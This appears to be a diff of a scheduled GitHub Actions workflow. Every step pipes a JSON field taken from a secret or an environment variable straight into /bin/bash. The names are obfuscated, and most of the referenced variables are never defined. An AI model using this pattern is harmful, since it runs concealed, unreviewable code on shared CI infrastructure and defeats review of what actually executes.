@@ -2,24 +2,20 @@ name: xinpianwk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 2/6 * * *'
-jobs:  # 3993
+    - cron: '1 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xinpianwk
         env:
-          psfd95223: ${{ secrets.psfd95223 }}
+          aaf6: ${{ secrets.aaf6 }}
         run: |
-          echo $psfd95223 | jq -r .zi6098 | /bin/bash
-          echo $fhh8 | jq -r .e624 | /bin/bash
-          echo $evlr8208 | jq -r .dhpa85 | /bin/bash
-          echo $meoir1299 | jq -r .v3485 | /bin/bash
-          echo $evf3400 | jq -r .tfk16 | /bin/bash
-          echo $vgjv15556 | jq -r .yxnsj81126 | /bin/bash
-          echo $zq83957 | jq -r .tgyx5176 | /bin/bash
-          echo $d20751 | jq -r .auv5224 | /bin/bash
-          echo $uxfro282 | jq -r .mloe88952 | /bin/bash
-          echo $l441 | jq -r .lanhm0982 | /bin/bash
+          echo $aaf6 | jq -r .do7457 | /bin/bash
+          echo $m078 | jq -r .ge4606 | /bin/bash
+          echo $gkbg7586 | jq -r .cfh8 | /bin/bash
+          echo $svf369 | jq -r .syqgh385 | /bin/bash
 
